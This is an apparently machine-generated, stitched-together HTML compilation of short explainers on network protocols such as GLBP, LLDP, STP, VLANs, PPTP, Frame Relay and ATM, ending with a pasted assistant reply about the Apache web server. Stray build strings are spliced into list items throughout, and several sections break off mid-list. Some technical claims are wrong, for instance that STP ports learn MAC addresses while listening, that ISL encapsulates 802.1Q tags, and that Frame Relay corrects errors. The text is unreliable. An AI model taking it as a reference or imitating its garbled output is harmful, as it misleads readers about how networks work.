<li><strong>Packet Format:</strong> GLBP packets utilize UDP on port 3222 for communication between gateways participating in the virtual router. network-protocols network-protocols-filenames-with-links <strong>Virtual Router ID:</strong> Gateways within a GLBP domain share a common Virtual Router ID (VRID), allowing them to function as a single virtual router for network clients. network-protocols network-protocols-filenames-with-links <strong>Gateway Priority:</strong> Each gateway in the GLBP domain is assigned a priority value. Higher priority signifies a more preferred gateway for forwarding traffic. network-protocols network-protocols-filenames-with-links <strong>Health Monitoring:</strong> GLBP gateways continuously monitor each other's health using hello packets. If a gateway fails to respond, the remaining gateways remove it from the forwarding path.</li>
<li><strong>Load Balancing Algorithms:</strong> GLBP supports various load balancing algorithms, including round robin, source IP hash, and weighted distribution, enabling tailored traffic distribution based on specific needs.</li>
</ul>
<p><strong>Use Cases:</strong></p>
<ul>
<li><strong>High Availability Networks:</strong> GLBP ensures continuous service availability even when individual gateways fail.</li>
<li><strong>Load Balancing Across Multiple Gateways:</strong> GLBP efficiently distributes traffic across gateways for optimized network performance.</li>
<li><strong>Secure Network Access:</strong> GLBP can be integrated with firewalls and VPNs for enhanced security.</li>
<li><strong>Large-Scale Network Deployments:</strong> GLBP scales effectively to support extensive networks with numerous gateways and clients.</li>
</ul>
<p><strong>Implementation:</strong></p>
<p>GLBP is natively supported on many network devices, including routers, switches, and firewalls. Additionally, software implementations of GLBP are available for various operating systems.</p>

<h2 id="lldp-network-protocol-explained"><a class="header" href="#lldp-network-protocol-explained">LLDP Network Protocol Explained</a></h2>
<h2 id="introduction-2"><a class="header" href="#introduction-2">Introduction</a></h2>
<p>The Link Layer Discovery Protocol (LLDP) is a network protocol used by network devices to advertise information about themselves to other devices on the same network. This information can include the device's name, type, capabilities, and IP address. LLDP is standardized in the IEEE 802.1AB standard.</p>
<p>LLDP is a neighbor discovery protocol, which means that it is used to discover neighboring devices on a network. It is not used to communicate with devices that are not neighbors. LLDP is a lightweight protocol, which means that it does not consume much bandwidth or processing power. This makes it suitable for use in networks with limited resources.</p>
<h2 id="how-lldp-works"><a class="header" href="#how-lldp-works">How LLDP Works</a></h2>
<p>LLDP operates at the data link layer of the OSI model. This means that it is used to exchange information between devices on the same network segment. LLDP messages are sent within Ethernet frames. These frames are sent to a multicast address, which means that they are received by all devices on the network segment.</p>
<p>LLDP messages contain a variety of information about the sending device, including:</p>
<ul>
<li>The device's name</li>
<li>The device's type</li>
<li>The device's capabilities</li>
<li>The device's IP address</li>
</ul>
<p>LLDP messages are also used to negotiate the quality of service (QoS) parameters for network traffic. This allows devices to prioritize network traffic based on its importance.</p>
<h2 id="lldp-applications"><a class="header" href="#lldp-applications">LLDP Applications</a></h2>
<p>LLDP has a variety of applications, including:</p>
<ul>
<li><strong>Network topology discovery:</strong> LLDP can be used to discover the topology of a network, which can be useful for troubleshooting and network planning.</li>
<li><strong>Device identification:</strong> LLDP can be used to identify devices on a network, which can be useful for network management.</li>
<li><strong>VLAN configuration:</strong> LLDP can be used to configure VLANs on network devices.</li>
<li><strong>Power over Ethernet (PoE):</strong> LLDP can be used to negotiate the power requirements of PoE devices.</li>
</ul>
<h2 id="security-considerations-2"><a class="header" href="#security-considerations-2">Security Considerations</a></h2>
<p>LLDP is a relatively secure protocol, but there are a few security considerations that should be taken into account:</p>
<ul>
<li><strong>LLDP messages can be spoofed:</strong> This could allow an attacker to gain unauthorized access to a network.</li>
<li><strong>LLDP messages can be used to gather information about a network:</strong> This information could be used to launch an attack.</li>
</ul>
<p>To mitigate these security risks, it is important to:</p>
<ul>
<li><strong>Enable LLDP security features:</strong> These features can help to prevent unauthorized access to a network.</li>
<li><strong>Monitor LLDP traffic:</strong> This can help to identify potential attacks.</li>
</ul>
<h2 id="conclusion-10"><a class="header" href="#conclusion-10">Conclusion</a></h2>
<p>LLDP is a valuable tool for network administrators. It can be used to discover the topology of a network, identify devices, configure VLANs, and negotiate QoS parameters. However, it is important to be aware of the security considerations when using LLDP.</p>

<h2 id="ip-network-protocol-1"><a class="header" href="#ip-network-protocol-1">IP Network Protocol</a></h2>
<p>The IP Network Protocol (IP) is a fundamental component of the internet protocol suite responsible for routing data packets across networks. It operates at the Network layer (Layer 3) of the OSI model and defines the format and transmission of data packets between devices.</p>
<h3 id="key-features-of-ip"><a class="header" href="#key-features-of-ip">Key Features of IP:</a></h3>
<ul>
<li><strong>Addressable packets:</strong> Each packet includes information about the source and destination devices, enabling routing across networks.</li>
<li><strong>Unreliable delivery:</strong> IP doesn't guarantee packet delivery or order. Higher-level protocols handle reliability and sequencing.</li>
<li><strong>Stateless:</strong> IP doesn't maintain information about previous packets, making it efficient but requiring additional protocols for flow control.</li>
<li><strong>Best-effort delivery:</strong> IP strives to deliver packets but doesn't prioritize or guarantee quality of service.</li>
<li><strong>Self-contained:</strong> Each packet carries all necessary information for routing, independent of previous packets.</li>
</ul>
<h3 id="ip-packet-structure"><a class="header" href="#ip-packet-structure">IP Packet Structure:</a></h3>
<p>An IP packet consists of two main sections: header and payload.</p>

add-network-protocols.rb network-protocols network-protocols-filenames-with-links Header Checksum: Ensures header integrity during transmission
add-network-protocols.rb network-protocols network-protocols-filenames-with-links Source and Destination IP Addresses: Identify the sending and receiving devices</li>
<li><strong>Payload:</strong> Contains the actual data being transferred, such as text, video, or images.</li>
</ul>
<h3 id="ip-addressing"><a class="header" href="#ip-addressing">IP Addressing:</a></h3>
<p>IP uses two main addressing schemes: IPv4 and IPv6.</p>
<ul>
<li><strong>IPv4:</strong> Employs 32-bit addresses written in dotted-decimal notation (e.g., 192.168.1.1). Due to exhaustive allocation, IPv4 utilizes Network Address Translation (NAT) for private networks and public IP sharing.</li>
<li><strong>IPv6:</strong> Utilizes 128-bit addresses written in hexadecimal format (e.g., 2001:db8:85a3:08d3:1319:8a2e:0370:7344). IPv6 offers a vastly expanded address space, eliminating the need for NAT and simplifying network configuration.</li>
</ul>
<h3 id="routing-protocols"><a class="header" href="#routing-protocols">Routing Protocols:</a></h3>
<p>IP relies on routing protocols like OSPF and BGP to determine the optimal path for packets to take across networks. These protocols dynamically update routing tables to ensure packets reach their destination efficiently.</p>
<h3 id="applications-1"><a class="header" href="#applications-1">Applications:</a></h3>
<p>IP enables communication between countless devices on the internet, facilitating diverse applications such as:</p>

<h2 id="nfs-network-protocol-an-overview"><a class="header" href="#nfs-network-protocol-an-overview">NFS Network Protocol: An Overview</a></h2>
<p>Network File System (NFS) is a widely used distributed file system protocol that allows users to access files over a network like they were stored locally. It enables <strong>transparent access</strong> to files located on remote servers, meaning users can interact with them as if they were on their own machine. This eliminates the need to physically transfer files between systems, simplifying data sharing and collaboration.</p>
<p><strong>Here's a breakdown of NFS functionality:</strong></p>
<ul>
<li><strong>Client-server model:</strong> NFS operates on a client-server architecture. The client system, typically a user's computer, requests access to files on the server, which hosts the shared files. The server then handles these requests and delivers the requested data to the client.</li>
<li><strong>File access:</strong> NFS provides users with basic file access operations, including read, write, create, delete, rename, and change permissions. It also supports file locking mechanisms to ensure data integrity during concurrent access.</li>
<li><strong>Remote procedure calls (RPCs):</strong> NFS uses RPCs for communication between clients and servers. RPCs are messages exchanged over the network to perform specific tasks, like opening a file or reading data.</li>
<li><strong>Stateless protocol:</strong> NFS is a stateless protocol, meaning each RPC call is independent and doesn't rely on previous interactions. This simplifies implementation and improves scalability.</li>
<li><strong>Mount points:</strong> To access remote files, clients mount a directory from the server onto their local file system. This creates a virtual representation of the remote directory, allowing users to interact with files as if they were local.</li>
</ul>
<p><strong>Key benefits of using NFS:</strong></p>
<ul>
<li><strong>Transparency:</strong> Users can access remote files seamlessly, as if they were stored locally.</li>
<li><strong>Centralized storage:</strong> Files are stored on a central server, facilitating data management and backup.</li>
<li><strong>Sharing and collaboration:</strong> Multiple users can access and modify files simultaneously, enabling efficient collaboration.</li>
<li><strong>Platform independence:</strong> NFS operates across various operating systems, including Linux, Unix, Windows, and macOS.</li>
<li><strong>Scalability:</strong> NFS can handle large file systems and numerous clients efficiently.</li>
</ul>
<p><strong>NFS versions:</strong></p>
<p>Several versions of NFS exist, each with improvements and additional features. The most common versions are:</p>
<ul>
<li><strong>NFSv2:</strong> The first widely adopted version, providing basic file access functionality.</li>
<li><strong>NFSv3:</strong> Introduced support for asynchronous operations, improved performance, and security enhancements.</li>
<li><strong>NFSv4:</strong> The current standard, offering significant improvements in scalability, security, and data integrity.</li>
</ul>
<p><strong>NFS security considerations:</strong></p>
<p>While NFS offers convenience, it's crucial to implement appropriate security measures to protect data on the server. This includes:</p>
<ul>
<li><strong>Authentication and authorization:</strong> Ensuring only authorized users can access specific files and directories.</li>
<li><strong>Data encryption:</strong> Encrypting data in transit and at rest to prevent unauthorized access.</li>
<li><strong>Firewall configuration:</strong> Implementing firewalls to restrict access to NFS ports and only allow authorized traffic.</li>
</ul>
<p><strong>Applications of NFS:</strong></p>
<p>NFS is widely used in various scenarios, including:</p>

<h2 id="pptp-network-protocol-explained"><a class="header" href="#pptp-network-protocol-explained">PPTP Network Protocol Explained</a></h2>
<h2 id="what-is-pptp"><a class="header" href="#what-is-pptp">What is PPTP?</a></h2>
<p>The Point-to-Point Tunneling Protocol (PPTP) is a network protocol that creates a secure tunnel between two devices over a public network, most commonly, the internet. This tunnel encrypts data transmitted between these devices, establishing a virtual private network (VPN).</p>
<p>PPTP was initially developed by Microsoft for dial-up internet connections but became a common solution for connecting remotely to corporate networks due to its compatibility with all major desktop operating systems and its relatively simple setup process. However, it has gradually been overshadowed by newer and more secure VPN protocols.</p>
<h2 id="technical-details-of-pptp"><a class="header" href="#technical-details-of-pptp">Technical Details of PPTP</a></h2>
<p>PPTP utilizes the Generic Routing Encapsulation (GRE) protocol and operates in three stages:</p>
<ol>
<li><strong>Establishing the tunnel:</strong> The PPTP client sends authentication requests to the PPTP server, negotiating encryption parameters and confirming user credentials.</li>
<li><strong>Packet encapsulation:</strong> Data packets are then encapsulated with additional header information containing control and addressing information specific to the tunnel.</li>
<li><strong>Data transmission and decryption:</strong> Encapsulated packets are sent over the public network to the PPTP server, where they are decapsulated and decrypted, revealing the original data content.</li>
</ol>
<h2 id="features-of-pptp"><a class="header" href="#features-of-pptp">Features of PPTP</a></h2>
<ul>
<li>Relatively simple implementation and configuration.</li>
<li>Cross-platform compatibility with Windows, macOS, Linux, iOS, and Android.</li>
<li>Efficient use of network resources due to minimal overhead.</li>
<li>Supports various encryption algorithms.</li>
</ul>
<h2 id="security-considerations-with-pptp"><a class="header" href="#security-considerations-with-pptp">Security Considerations with PPTP</a></h2>
<p>Although PPTP has proven effective for basic VPN scenarios, it has several security concerns and vulnerabilities, making it unsuitable for sensitive applications or high-risk situations. Some reasons for this include:</p>
<ul>
<li><strong>MS-CHAPv2 vulnerability:</strong> The Microsoft Challenge Handshake Authentication Protocol version 2 (MS-CHAPv2) used for authentication has been shown to be vulnerable to man-in-the-middle attacks.</li>
<li><strong>Vulnerability to brute-force attacks:</strong> The encryption algorithms used by PPTP are considered weaker than those used by more modern protocols and are susceptible to cracking by brute-force attacks.</li>
<li><strong>Lack of advanced security features:</strong> PPTP lacks newer security features like perfect forward secrecy, which makes it susceptible to traffic analysis and potential decryption.</li>
</ul>
<p>Due to security concerns, many VPN providers no longer actively recommend or support PPTP and recommend switching to more secure alternatives like OpenVPN, IKEv2, or WireGuard.</p>
<h2 id="conclusion-13"><a class="header" href="#conclusion-13">Conclusion</a></h2>
<p>PPTP was a pivotal protocol in the early days of VPNs, offering a bridge between remote users and secure network access. However, advancements in technology and increasing security concerns have rendered it an outdated and insecure method for protecting sensitive communication over public networks. If you prioritize privacy and security, switching to a more contemporary VPN protocol is highly recommended.</p>

<h2 id="gre-network-protocol-1"><a class="header" href="#gre-network-protocol-1">GRE Network Protocol</a></h2>
<p>The Generic Routing Encapsulation (GRE) Network Protocol is a versatile tunneling protocol that encapsulates network layer protocols within other network layer protocols. It's commonly used for:</p>
<ul>
<li><strong>Virtual Private Network (VPN) tunnels:</strong> GRE tunnels can securely extend private networks over public networks like the internet, allowing users remote access to resources.</li>
<li><strong>Point-to-point connections:</strong> GRE can create secure, point-to-point links between two devices, regardless of their physical location.</li>
<li><strong>Multicast routing:</strong> GRE enables efficient multicast routing across different network segments.</li>
</ul>
<h2 id="how-gre-works"><a class="header" href="#how-gre-works">How GRE Works</a></h2>
<p>GRE operates at the network layer (Layer 3) of the OSI model. It encapsulates the original packet (including its header) within a new GRE header, creating a new packet with a different protocol type. This new packet can then be transmitted over the chosen tunneling protocol. </p>
<p>Here's a breakdown of the process:</p>
<ol>
<li><strong>Encapsulation:</strong> The original packet is placed inside a GRE header, which contains information like the tunneling protocol and the destination address.</li>
<li><strong>Tunneling:</strong> The GRE packet is then encapsulated within the chosen tunneling protocol, such as IP or Ethernet.</li>
<li><strong>Transmission:</strong> The resulting packet is transmitted over the network.</li>
<li><strong>Decapsulation:</strong> At the receiving end, the outer layer is removed, revealing the original GRE packet. </li>
<li><strong>Decapsulation:</strong> Finally, the GRE header is removed, and the original packet is delivered to its intended destination.</li>
</ol>
<h2 id="gre-header-structure"><a class="header" href="#gre-header-structure">GRE Header Structure</a></h2>

It calculates the best path based on various routing metrics including bandwidth, delay, load, and reliability. network-protocols network-protocols-filenames-with-links <strong>Feasible Successor and Successor:</strong> DUAL maintains two routing tables: the topology table (containing all learned routes) and the routing table (containing only the best path for each destination). It designates the next best path as the &quot;feasible successor&quot; and the best path as the &quot;successor&quot; for quick failover in case the primary path fails.</li>
<li><strong>Fast Convergence:</strong> EIGRP uses several mechanisms for fast convergence, including triggered updates (sending updates only when a topology change occurs), holddown timers (preventing routing loops), and split horizon with poison reverse (avoiding sending updates back to the source of a route). network-protocols network-protocols-filenames-with-links <strong>Scalability:</strong> EIGRP can handle large, complex networks efficiently due to its selective route updates and efficient route summarization capabilities.</li>
<li><strong>Authentication:</strong> EIGRP offers multiple authentication mechanisms like MD5 and password authentication to ensure secure routing updates.</li>

<h2 id="stp-network-protocol-explained-in-detail"><a class="header" href="#stp-network-protocol-explained-in-detail">STP Network Protocol Explained in Detail</a></h2>
<p>The Spanning Tree Protocol (STP) is a network protocol that prevents network loops by creating a loop-free topology. It accomplishes this by designating certain ports as either designated ports or blocked ports. Designated ports are part of the active topology and forward traffic, while blocked ports are not part of the active topology and do not forward traffic. </p>
<p>STP operates on the data link layer of the OSI model and uses the 802.1D standard. It is implemented in most network switches and bridges.</p>
<h3 id="stp-operation"><a class="header" href="#stp-operation">STP Operation:</a></h3>
<ol>
<li><strong>Initialization</strong>: Upon initialization, all switch ports are placed in the listening state. In this state, the port does not participate in the STP process. </li>
<li><strong>Port Selection</strong>: Next, each port listens to the network traffic and selects the port with the lowest designated bridge ID and lowest port priority as the root port. The root port becomes part of the active topology and forwards traffic. </li>
<li><strong>Path Calculation</strong>: Once a root port is selected, the switch calculates the shortest path to the root bridge using the Spanning Tree Algorithm (STA). Ports that are not part of the shortest path are designated as blocked ports and do not forward traffic. </li>
<li><strong>Learning and Aging</strong>: While in the listening state, ports learn the MAC addresses of devices connected to them and add them to their MAC address table. After a certain period of inactivity, these MAC addresses are aged out and removed from the table. </li>
<li><strong>Topology Changes</strong>: If the network topology changes, the STP process will re-run to recalculate the shortest path to the root bridge. This may cause some ports to switch from blocked to designated or vice versa. </li>
</ol>
<h3 id="benefits-of-stp"><a class="header" href="#benefits-of-stp">Benefits of STP:</a></h3>
<ul>
<li><strong>Prevents network loops</strong>: Eliminates redundant paths and ensures data is transmitted without looping. network-protocols network-protocols-filenames-with-links <strong>Improves network stability</strong>: Minimizes network disruptions caused by topology changes. network-protocols network-protocols-filenames-with-links <strong>Increases network efficiency</strong>: Forwards traffic on the most efficient paths. network-protocols network-protocols-filenames-with-links <strong>Improves network security</strong>: Blocks unauthorized devices from accessing the network. </li>
</ul>
<h3 id="limitations-of-stp"><a class="header" href="#limitations-of-stp">Limitations of STP:</a></h3>
<ul>
<li><strong>Slow convergence</strong>: Can take several seconds to react to network changes, which may cause temporary disruptions. network-protocols network-protocols-filenames-with-links <strong>Complex configuration</strong>: Requires careful configuration and troubleshooting. network-protocols network-protocols-filenames-with-links <strong>Not suitable for all networks</strong>: May not be suitable for large or complex networks. </li>
</ul>
<h3 id="alternatives-to-stp"><a class="header" href="#alternatives-to-stp">Alternatives to STP:</a></h3>
<ul>
<li><strong>Rapid Spanning Tree Protocol (RSTP)</strong>: Faster convergence time than STP.</li>

<div style="break-before: page; page-break-before: always;"></div><h1 id="vlan-network-protocol"><a class="header" href="#vlan-network-protocol">VLAN Network Protocol</a></h1>
<h2 id="what-is-a-vlan-network-protocol"><a class="header" href="#what-is-a-vlan-network-protocol">What is a VLAN Network Protocol?</a></h2>
<p>A VLAN Network Protocol doesn't exist in the traditional sense. VLANs, or Virtual Local Area Networks, operate at Layer 2 of the OSI model, the data link layer. They use protocols like IEEE 802.1Q to tag frames with a VLAN identifier, allowing network administrators to segment a physical network into multiple logical networks. Each VLAN acts as a separate broadcast domain, meaning devices in different VLANs cannot directly communicate with each other unless routed through a device like a Layer 3 switch or router.</p>
<p>While there's no specific &quot;VLAN Network Protocol&quot;, several protocols contribute to VLAN functionality:</p>
<p><strong>1. IEEE 802.1Q:</strong> This is the most common protocol for VLAN tagging. It inserts a 4-byte tag into the Ethernet frame header, containing information like the VLAN ID and priority. Switches use this tag to identify which VLAN the frame belongs to and forward it accordingly.</p>
<p><strong>2. Inter-Switch Link (ISL):</strong> This Cisco proprietary protocol encapsulates 802.1Q tags within the frame itself, allowing communication between Cisco switches without needing native 802.1Q support.</p>
<p><strong>3. VLAN Trunking Protocol (VTP):</strong> This Cisco protocol allows switches to dynamically share VLAN information across the network. VTP helps maintain consistency and simplifies configuration across multiple switches.</p>
<p><strong>4. Dynamic Host Configuration Protocol (DHCP):</strong> While not directly related to VLANs, DHCP can be used to automatically assign IP addresses to devices based on their VLAN membership. This simplifies network management and ensures devices are assigned the correct network resources.</p>
<p><strong>5. Spanning Tree Protocol (STP):</strong> This protocol prevents loops in Layer 2 networks by disabling redundant links. It works seamlessly with VLANs, ensuring traffic only flows on the necessary paths within each VLAN.</p>
<p><strong>6. Routing protocols:</strong> While VLANs segment Layer 2 traffic, routing protocols like OSPF and BGP are used to route traffic between different VLANs and networks at Layer 3.</p>
<p><strong>7. Management protocols:</strong> SNMP and SSH are commonly used to manage switches and configure VLANs remotely.</p>
<p>These protocols work together to create a robust and flexible VLAN environment. </p>
<p>It's important to note that VLANs are implemented and configured at the network device level, not through a specific network protocol. </p>

<h2 id="mpls-network-protocol-1"><a class="header" href="#mpls-network-protocol-1">MPLS Network Protocol:</a></h2>
<p>MPLS, or <strong>Multiprotocol Label Switching</strong>, is a high-performance data-carrying technique that directs data from one network to another using labels. Labels are short identifiers attached to network packets that indicate the path the data should take through the MPLS cloud. Routers in the MPLS networks direct the network packets based on these labels rather than examining the full packet header, which improves performance.</p>
<h3 id="here-are-more-specifics-about-mpls"><a class="header" href="#here-are-more-specifics-about-mpls">Here are more specifics about MPLS:</a></h3>
<p><strong>Functionality:</strong></p>
<ul>
<li>Labels are applied to packets at the edge of an MPLS network, which helps simplify and expedite the forwarding process as packets traverse the network.</li>
<li>Different paths, or Forwarding Equivalence Classes (FECs), can be established based on Label Switched Paths (LSPs).</li>
<li>Layer 3 routing protocols like Border Gateway Protocol (BGP) are used by MPLS to set up LSP.</li>
<li>MPLS supports both Layer 2 and Layer 3 VPN services. Layer 2 VPN establishes a virtual point-to-point connection that functions like two devices connected directly to LANs, while MPLS allows businesses to build Layer 3 VPNs, also known as IP VPN, for increased security over public networks with access control mechanisms such as access control, multi-factor or virtual private tunnels.</li>
</ul>
<p><strong>Benefits:</strong></p>
<ul>
<li>Improves network performance by optimizing routing decisions.</li>

<h2 id="ppp-network-protocol-a-detailed-look"><a class="header" href="#ppp-network-protocol-a-detailed-look">PPP Network Protocol: A Detailed Look</a></h2>
<p>The Point-to-Point Protocol (PPP) is a key networking protocol that enables communication between two devices over a direct link. It's widely used in various scenarios, including:</p>
<ul>
<li><strong>Connecting individual computers to the internet:</strong> PPP allows individual computers to dial into an Internet Service Provider (ISP) and access the internet.</li>
<li><strong>Connecting networks:</strong> PPP can connect two private networks over a leased line or other dedicated connection.</li>
<li><strong>Connecting routers:</strong> PPP is used to establish connections between routers across various network types like WANs and the internet.</li>
</ul>
<p>Here's a deeper dive into the specifics of PPP:</p>
<p><strong>Key Features:</strong></p>
<ul>
<li><strong>Simplicity:</strong> PPP is designed to be a simple and efficient protocol, making it suitable for various applications.</li>
<li><strong>Flexibility:</strong> It supports a wide range of network layer protocols, including IP, IPX, and AppleTalk.</li>
<li><strong>Extensibility:</strong> PPP allows for the addition of new features and options through configuration options and extensions.</li>
<li><strong>Error Detection and Correction:</strong> PPP implements error detection and correction mechanisms to ensure data integrity during transmission.</li>
<li><strong>Authentication:</strong> It incorporates authentication protocols like Password Authentication Protocol (PAP) and Challenge Handshake Authentication Protocol (CHAP) for secure access control.</li>
</ul>
<p><strong>Technical Details:</strong></p>
<ul>
<li><strong>Structure:</strong> PPP frames consist of a header and a payload. The header contains control information like protocol type, address information, and error checking fields. The payload carries the actual data being transmitted.</li>
<li><strong>Link Control:</strong> PPP uses Link Control Protocol (LCP) to establish, configure, and maintain the data link between the two devices. LCP negotiates parameters like maximum transmission unit (MTU) and authentication protocols.</li>
<li><strong>Network Control:</strong> Network Control Protocol (NCP) is responsible for configuring and managing the network layer protocol chosen for data transmission. Different NCPs exist for different protocols like IP (IPCP) and IPX (IPXCP).</li>
<li><strong>Maximum Transmission Unit (MTU):</strong> PPP allows for negotiation of the MTU size, which determines the maximum size of data packets that can be transmitted. This is crucial for optimizing network performance and avoiding fragmentation issues.</li>
</ul>
<p><strong>Security Considerations:</strong></p>
<ul>
<li><strong>Authentication:</strong> While PPP offers authentication mechanisms like PAP and CHAP, it's important to note their limitations. Both PAP and CHAP are vulnerable to eavesdropping attacks, where an attacker can capture the transmitted username and password. More secure alternatives like Extensible Authentication Protocol (EAP) are recommended for sensitive applications.</li>
<li><strong>Encryption:</strong> PPP itself does not provide encryption for data transmitted over the link. If confidentiality and data integrity are critical, implementing additional encryption protocols like IPsec or TLS is essential.</li>

<p>Frame Relay is a Layer 2 data-link layer protocol responsible for <strong>efficiently transmitting data packets</strong> across wide area networks (WANs). Unlike traditional circuit-switched networks, Frame Relay employs a <strong>packet-switching technique</strong> to share network resources dynamically among multiple users. This dynamic sharing allows for significant cost reductions compared to dedicated leased lines.</p>
<h2 id="how-does-frame-relay-work"><a class="header" href="#how-does-frame-relay-work">How Does Frame Relay Work?</a></h2>
<ol>
<li><strong>Data Segmentation:</strong> Frames Relay breaks down data into smaller <strong>variable-length packets</strong> called frames. These frames typically range from 53 bytes to 16,384 bytes in length.</li>
<li><strong>Frame Header:</strong> Each frame carries a header containing vital information, such as:
add-network-protocols.rb network-protocols network-protocols-filenames-with-links <strong>Data Link Connection Identifier (DLCI):</strong> Identifies the virtual circuit used for data transmission between specific endpoints.
add-network-protocols.rb network-protocols network-protocols-filenames-with-links <strong>Frame Type:</strong> Identifies the type of frame, such as data, control, or status frame.
add-network-protocols.rb network-protocols network-protocols-filenames-with-links <strong>Error Checking:</strong> Employs Cyclic Redundancy Check (CRC) for error detection and correction.</li>
<li><strong>Statistical Multiplexing:</strong> Multiple user traffic is dynamically multiplexed across a shared physical link, increasing network efficiency and utilization.</li>
<li><strong>Fast Switching:</strong> Frames are switched at high speeds within the network, minimizing delays and maximizing network throughput.</li>
<li><strong>Error Handling:</strong> Frame Relay relies on the upper layer protocols (IP) to handle error correction and retransmission.</li>
</ol>
<h2 id="key-features-and-benefits-of-frame-relay"><a class="header" href="#key-features-and-benefits-of-frame-relay">Key Features and Benefits of Frame Relay</a></h2>

<div style="break-before: page; page-break-before: always;"></div><h1 id="atm-network-protocol"><a class="header" href="#atm-network-protocol">ATM Network Protocol</a></h1>
<h2 id="atm-network-protocol-1"><a class="header" href="#atm-network-protocol-1">ATM Network Protocol</a></h2>
<p>The Asynchronous Transfer Mode (ATM) Network Protocol is a high-speed, cell-based switching and multiplexing technique for telecommunications networks. It was originally designed for high-bandwidth, real-time traffic such as voice, video, and data. However, its use has declined significantly in recent years due to the rise of more modern technologies like Ethernet and IP over Ethernet.</p>
<h3 id="key-features-of-atm"><a class="header" href="#key-features-of-atm">Key Features of ATM:</a></h3>
<ul>
<li><strong>Cell-based switching</strong>: ATM transmits data in small, fixed-size packets called cells. Each cell consists of a 5-byte header and a 48-byte payload. This approach simplifies routing and switching compared to variable-length packets.</li>
<li><strong>Asynchronous</strong>: Cells are transmitted asynchronously, meaning they can be sent and received at any time without the need for synchronization or coordination between sending and receiving entities.</li>
<li><strong>Multiple virtual circuits</strong>: ATM supports multiple virtual circuits (VCs) over a single physical connection. This enables efficient sharing of resources among multiple users and applications.</li>
<li><strong>Quality of service (QoS):</strong> ATM provides mechanisms for prioritizing and guaranteeing specific levels of service for different traffic types. This is critical for real-time applications that require predictable latency and jitter characteristics.</li>
<li><strong>Flexibility</strong>: ATM can be used over a variety of physical media, including twisted-pair, coaxial cable, fiber optic, and wireless.</li>
</ul>
<h3 id="protocol-stack"><a class="header" href="#protocol-stack">Protocol Stack:</a></h3>
<p>The ATM protocol stack consists of four layers:</p>
<ul>
<li>Physical Layer (PHY): Provides the physical interface between devices and the transmission medium. network-protocols network-protocols-filenames-with-links ATM Layer: Defines the structure and handling of ATM cells, including cell header format, cell delineation, and error checking.</li>
<li>ATM Adaptation Layer (AAL): Adapts different types of traffic (e.g., voice, video, data) to the ATM cell format. network-protocols network-protocols-filenames-with-links Higher Layer Protocols: Includes protocols for various applications such as IP, Frame Relay, and MPLS.</li>
</ul>
<h3 id="addressing-and-routing"><a class="header" href="#addressing-and-routing">Addressing and Routing:</a></h3>
<p>ATM uses a hierarchical addressing scheme to identify specific destinations on the network. Addresses consist of two parts: a Network Service Access Point (NSAP) identifier and a Virtual Path Identifier/Virtual Channel Identifier (VPI/VCI). The NSAP identifies the network, while the VPI/VCI identifies the specific virtual connection on that network. Routing decisions are made based on the destination VPI/VCI.</p>
<h3 id="applications-5"><a class="header" href="#applications-5">Applications:</a></h3>
<p>Although not as widely used as it once was, ATM still plays a role in some niche applications, including:</p>
<ul>
<li><strong>High-speed backbone networks</strong>: ATM can be used to establish high-bandwidth connections between network elements like routers and switches.</li>
<li><strong>Mobile backhaul</strong>: ATM can be used to connect base stations to the core network in cellular networks.</li>
<li><strong>Voice over IP (VoIP)</strong>: ATM can be used to carry VoIP traffic, particularly in legacy systems.</li>
</ul>
<h3 id="conclusion-18"><a class="header" href="#conclusion-18">Conclusion:</a></h3>
<p>While ATM has largely been supplanted by newer technologies, its innovative design and features made it a significant advancement in high-speed networking. Its legacy continues to influence modern technologies, especially in areas requiring high performance and quality of service guarantees. </p>

<h2 id="apache-web-server-overview"><a class="header" href="#apache-web-server-overview">Apache Web Server Overview</a></h2>
<p>There seems to be a bit of misunderstanding in your request. I can access and process information regarding the &quot;Apache Web Server,&quot; but I, myself, cannot &quot;be&quot; the Apache Web Server. </p>
<p>Here's what I can do for you:</p>
<p><strong>1. Provide comprehensive information about the Apache Web Server:</strong></p>
<p>Here's a high-level overview of the subject:</p>
<ul>
<li>
<p><strong>What it is:</strong>
An open-source web server software often abbreviated as &quot;Apache,&quot; 
it's developed and maintained by the Apache Software Foundation. Used by 
millions of websites worldwide, it powers 39% of all websites, making 
it the most popular choice amongst website operators. </p>
</li>
<li>
<p><strong>How it works:</strong>
Apache primarily functions on Unix-based machines, including Linux 
and macOS. Once installed on a server hosting a website, your web 
browser communicates with Apache to serve website content. This includes 
HTML pages, images, and other files like CSS and JavaScript. These files 
serve as the building blocks of a website that web browsers interpret 
and display content to you!</p>
</li>
<li>
<p><strong>Key features:</strong>
Apache boasts advanced features like:</p>
</li>
</ul>
<p><strong>- Modular architecture:</strong> Offers flexibility and adaptation through 
plug-and-play modules, allowing customization without altering or 
restarting the server. These modules cover security enhancements 
like URL authorization checks to caching content for quick retrieval.	</p>
<p><strong>- Platform independence:</strong> Runs seamlessly across most operating 
systems, including Windows, Linux, UNIX, and macOS for broad 
compatibility without extensive modification.</p>
<p><strong>- Active development cycle:</strong> Continuously updated with bug fixes, 
performance enhancements, and new features resulting in a robust and 
reliable web server capable of handling high internet traffic volumes..</p>
<p><strong>2. Additional information on specific details as needed:</strong></p>
<p>Depending on your specific needs. I can provide further, detailed 
information on topics concerning the Apache Web Server, such as::</p>
<ul>
<li>**Installation and configuration for different operating systems</li>
<li>Troubleshooting</li>
<li>Security best practices</li>
<li>Performance optimization</li>
<li>Module usage and capabilities</li>
<li>Specific configuration directives based on your unique scenario</li>
</ul>
<p><strong>3. Examples related to Apache Web Server:</strong></p>
<p>To delve deeper into how Apache Web Server performs its crucial role, 
here are some illustrative scenarios:</p>
<p><strong>Scenario 1:</strong> You visit <strong>www.wikipedia.org</strong> in your web browser. 
Upon typing it in, your browsing request travels along the internet 
until ultimately reaching the server where <code>www.wikipedia.org</code> resides</p>
<p>Assuming this server employs Apache, your query is handled by it. After 
locating the corresponding HTML pages, CSS directives, and embedded 
images based on your request, Apache relays these files back through 
the internet to finally reach and be rendered by your web browser. This 
completes serving the Wikipedia interface you see</p>
<p><strong>Scenario 2:</strong> An individual sets up their personal website using 
Apache on their home computer. Configuration parameters are adjusted to direct content requests on a specified port to the relevant local 
folder where their website files reside</p>
<p>Whenever someone access their website hosted on this computer through this port, web pages within the designated folder are automatically transmitted by Apache on the local network using the computer's internal IP for 
identification</p>
<p>Remember, I am here solely as a source you can leverage for 
information and assistance relating to the Apache Web Server. While a 
powerful tool enabling dynamic web server creation that millions around 
the world depend on, I am incapable of directly becoming or replacing such 
a server myself</p>
<p>Please specify your area of interest when it comes to the Apache Web 
